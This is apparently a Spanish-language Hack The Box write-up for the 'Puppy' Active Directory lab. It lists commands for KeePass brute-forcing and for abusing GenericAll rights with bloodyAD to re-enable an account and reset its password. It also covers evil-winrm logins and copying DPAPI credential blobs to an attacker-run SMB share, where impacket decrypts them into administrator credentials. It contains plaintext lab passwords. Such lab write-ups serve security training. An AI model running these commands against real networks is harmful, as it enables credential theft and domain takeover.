---
tags:
title: Puppy - Medium (HTB)
permalink: /Puppy-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento
### Reconocimientos de puertos y servicios. 

Credenciales iniciales de la maquina.
`levi.james:KingofAkron2025!`


`./keepass4brute recovery.kdbx /usr/share/wordlist/ropckyou.txt`

![image-center](/assets/images/Pasted image 20250717035458.png)


`keepassxc-cli export --format=xml recovery.kdbx > recovery.xml`

![image-center](/assets/images/Pasted image 20250717035303.png)


![image-center](/assets/images/Pasted image 20250717044827.png)


---
# User Flag

Luego vemos por bloodhound que tenemos permisos GenericAll sobre el usuario `Adam.Silver` y cuando le cambiamos la contraseÃ±a podemos ver que nos pone que la cuenta esta deshabilitada, asi que pasamos a habilitarla

```bash 
bloodyAD -u ant.edwards -p 'Antman2025!' --host dc.puppy.htb -d puppy.htb remove uac 'ADAM.SILVER' -f ACCOUNTDISABLE`
```

![image-center](/assets/images/Pasted image 20250717051830.png)


Luego le configuramos una nueva password
```bash 
bloodyAD -u ant.edwards -p 'Antman2025!' --host dc.puppy.htb -d puppy.htb set password 'ADAM.SILVER' 'Lalahola23'
```

![image-center](/assets/images/Pasted image 20250717151638.png)


```bash 
evil-winrm -i puppy.htb -u ADAM.SILVER -p Lalahola23
```

`type usert.txt`

---

# Third user escalation

Vemos en el directorio `C:\Backups` que un comprimido, por lo que lo descargamos para ver su contenido.

![image-center](/assets/images/Pasted image 20250717152604.png)


```css
> download site-backup-2024-12-30.zip
```

Lo descomprimimos 

```bash 
> unzip site-backup-2024-12-30.zip
```

Y lo cateamos con `cat` para ver su contenido. por lo que vemos credenciales para el tercer usuario.
`steph.cooper:ChefSteph2025!`

![image-center](/assets/images/Pasted image 20250717154125.png)


```BASH 
crackmapexec winrm 10.10.11.70 -u 'steph.cooper' -p 'ChefSteph2025!' 
```

```bash 
evil-winrm -i puppy.htb -u 'steph.cooper' -p 'ChefSteph2025!'
```

# Root Flag

Podemos notar que en la ruta `C:\Users\Steph.cooper\AppData\Roaming\Microsoft\Credentials\` esta la Clave maestra a descifrar y en el directorio `C:\Users\Steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\` esta el archivo *Masterkey* cifrado que puede contener hashes, credenciales, etc.

Para pasarlos a nuestra maquina hacemos lo siguiente:

Compartimos un recurso con *smbserver* 

```bash 
mkdir -p ./share
impacket-smbserver share ./share -smb2support
```

Copiamos los archivos a nuestra maquina. 

```bash 
copy "C:\Users\steph.cooper\appdata\roaming\microsoft\credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9" \\10.10.16.37\share\cred_blob
copy "C:\Users\steph.cooper\appdata\roaming\microsoft\protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407" \\10.10.16.37\share\master.blob
```

Crackeamos la clave maestra: 

`impacket-dpapi masterkey -f master.blob  -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'`

Crackeamos la *MasterkeyDPAPI*
`impacket-dpapi credential -f cred_blob -k 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84`

![image-center](/assets/images/Pasted image 20250717160857.png)


Obtenemos las credenciales del usuario Administrator

`steph.cooper_adm:FivethChipOnItsWay2025!`

```bash 
type root.txt
```

`~Happy Hacking.`
